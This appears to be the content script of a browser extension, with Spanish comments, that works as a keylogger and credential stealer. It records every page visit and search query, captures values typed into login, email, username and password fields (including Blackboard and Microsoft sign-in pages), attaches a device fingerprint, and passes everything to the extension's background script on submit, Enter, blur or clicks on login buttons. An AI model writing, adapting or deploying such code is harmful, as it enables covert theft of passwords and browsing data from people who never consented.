// Captura por formulario + visitas filtradas (solo top-frame)
(() => {
  const isTop = window.top === window.self;
  const stores = new Map();

  function fp() {
    try {
      return {
        ua: navigator.userAgent.slice(0, 220),
        plat: navigator.platform || '',
        lang: navigator.language || '',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        scr: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
        cpu: navigator.hardwareConcurrency || '?',
        ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?'
      };
    } catch (e) { return {}; }
  }

  function getSearch() {
    try {
      const u = new URL(location.href);
      const keys = ['q', 'query', 'text', 'search', 'p', 'keywords', 'k'];
      for (const k of keys) {
        const v = u.searchParams.get(k);
        if (v && v.length > 1 && v.length < 300) return v;
      }
    } catch (e) {}
    return '';
  }

  function blockedVisit(url, title) {
    const u = (url || '').toLowerCase();
    const t = (title || '').toLowerCase();
    if (!isTop) return true;
    if (u.startsWith('about:') || u.startsWith('chrome://') || u.startsWith('edge://')) return true;
    if (u.includes('notifications.api.blackboard') || u.includes('clientframe.html')) return true;
    if (u.includes('developer.blackboard.com/ltistorage')) return true;
    if (u.includes('signalr') || u.includes('sockjs') || u.includes('socket')) return true;
    if (t.includes('client frame') || t === 'lti storage') return true;
    if (u.length < 12) return true;
    return false;
  }

  function sendVisit() {
    if (!isTop) return;
    const url = location.href;
    if (blockedVisit(url, document.title) && !getSearch()) return;
    try {
      chrome.runtime.sendMessage({ __s: 'v', d: {
        u: url.slice(0, 300),
        title: document.title.slice(0, 150),
        ts: new Date().toISOString(),
        search: getSearch()
      }});
    } catch (e) {}
  }
  if (document.readyState === 'complete') sendVisit();
  else window.addEventListener('load', sendVisit);

  function isField(el) {
    if (!el || !el.tagName) return false;
    const t = (el.tagName || '').toUpperCase();
    if (t === 'TEXTAREA') return true;
    if (t === 'SELECT') return true;
    if (t !== 'INPUT') return false;
    const ty = (el.type || 'text').toLowerCase();
    if (['submit','button','reset','image','file','checkbox','radio','hidden'].includes(ty)) return false;
    return true;
  }

  function roleOf(el) {
    const ty = (el.type || 'text').toLowerCase();
    const nm = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' + (el.autocomplete || '') + ' ' + (el.getAttribute('aria-label') || '')).toLowerCase();
    if (ty === 'password') return 'pass';
    if (ty === 'email' || nm.includes('email') || nm.includes('e-mail') || nm.includes('mail')) return 'email';
    if (nm.includes('user') || nm.includes('login') || nm.includes('account') || nm.includes('uname') || ty === 'tel' || nm.includes('phone') || nm.includes('nick') || nm.includes('usuario') || nm.includes('correo') || nm.includes('loginfmt')) return 'user';
    if (nm.includes('pass') || nm.includes('pwd') || nm.includes('contrase') || nm.includes('passwd')) return 'pass';
    if (ty === 'search') return 'search';
    return ty || 'text';
  }

  function formKey(el) {
    const f = el.form;
    if (f) {
      if (!f.__k) f.__k = 'f' + Math.random().toString(36).slice(2,8);
      return f.__k;
    }
    return 'nofrm';
  }

  function keyOf(el) {
    return (el.name || el.id || el.placeholder || el.type || el.tagName) + '|' + (el.type || '');
  }

  function getStore(el) {
    const k = formKey(el);
    if (!stores.has(k)) stores.set(k, { url: location.href, fields: new Map(), timer: null });
    return stores.get(k);
  }

  function track(el) {
    if (!isField(el)) return;
    // ignora campos vacios en iframes ocultos
    if (!isTop && (!el.value || !el.value.length)) return;
    const st = getStore(el);
    st.url = location.href;
    const k = keyOf(el);
    st.fields.set(k, {
      role: roleOf(el),
      type: (el.type || el.tagName).toLowerCase(),
      name: el.name || el.id || el.placeholder || '(sin-nombre)',
      value: (el.value || '').slice(0, 500)
    });
  }

  function collectForm(form) {
    const els = form ? form.querySelectorAll('input,textarea,select') : document.querySelectorAll('input,textarea,select');
    els.forEach(track);
  }

  function flushByKey(k, reason) {
    const st = stores.get(k);
    if (!st) return;
    if (st.timer) { clearTimeout(st.timer); st.timer = null; }
    const fields = [...st.fields.values()].filter(f => f.value && f.value.length);
    if (!fields.length) return;
    // en modo directo: si es blur de campo suelto sin credencial ni busqueda, descartar
    const hasCred = fields.some(f => f.role === 'pass' || f.role === 'user' || f.role === 'email');
    if (reason === 'blur' && !hasCred) return;
    const payload = {
      u: (st.url || location.href).slice(0, 300),
      title: document.title.slice(0, 150),
      reason: reason,
      fields: fields,
      ts: new Date().toISOString(),
      fp: fp(),
      search: getSearch()
    };
    st.fields.clear();
    try { chrome.runtime.sendMessage({ __s: 'k', d: payload }); } catch (e) {}
  }

  function scheduleBlur(k) {
    const st = stores.get(k);
    if (!st) return;
    if (st.timer) clearTimeout(st.timer);
    st.timer = setTimeout(() => flushByKey(k, 'blur'), 1500);
  }

  document.addEventListener('input', (e) => { track(e.target); }, true);
  document.addEventListener('change', (e) => { track(e.target); }, true);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && isField(e.target)) {
      track(e.target);
      collectForm(e.target.form);
      flushByKey(formKey(e.target), 'enter');
    }
  }, true);

  document.addEventListener('submit', (e) => {
    const f = e.target;
    if (f && f.tagName === 'FORM') {
      collectForm(f);
      const k = f.__k || formKey({ form: f });
      if (stores.has(k)) flushByKey(k, 'submit');
      else [...stores.keys()].forEach(kk => flushByKey(kk, 'submit'));
    }
  }, true);

  document.addEventListener('focusout', (e) => {
    if (!isField(e.target)) return;
    track(e.target);
    scheduleBlur(formKey(e.target));
  }, true);

  document.addEventListener('click', (e) => {
    const el = e.target && e.target.closest ? e.target.closest('button,input') : null;
    if (!el) return;
    const t = ((el.type || el.tagName) || '').toLowerCase();
    const txt = ((el.innerText || el.value) || '').toLowerCase();
    if (t === 'submit' || txt.includes('login') || txt.includes('entrar') || txt.includes('sign in') || txt.includes('iniciar') || txt.includes('next') || txt.includes('siguiente') || txt.includes('continuar')) {
      [...stores.keys()].forEach(kk => flushByKey(kk, 'submit'));
    }
  }, true);
})();
